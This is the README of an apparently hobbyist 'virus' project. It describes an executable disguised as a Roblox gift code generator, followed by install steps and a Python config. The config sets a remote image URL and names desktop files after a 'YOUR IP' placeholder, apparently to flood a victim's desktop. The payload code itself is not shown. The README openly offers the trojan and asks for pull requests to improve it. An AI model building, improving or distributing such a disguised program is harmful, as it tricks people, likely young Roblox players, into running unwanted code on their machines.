## Vírus Perceba
it's an executable file that passes itself off as a roblox gift code generator

> [!WARNING]
> THIS CODE IS VERY BAD, so make a pull request or an issue to improve it.

## Requirements
run this code to install the requirements:
```cmd
pip install -r requirements.txt
```

## Customizing
to customize look at the config file
```python
# Here you can configure Virus
# have fun modifying

url = "https://raw.githubusercontent.com/GuineaPigUuhh/randomimgs/main/perceba.jpeg"

def fileIN(i):
    imgvirus = 'YOUR IP' # Name of the image to be created on the desktop
    extvirus = 'jpeg' # Image Extension
    return f'{imgvirus} ({i}).{extvirus}'
```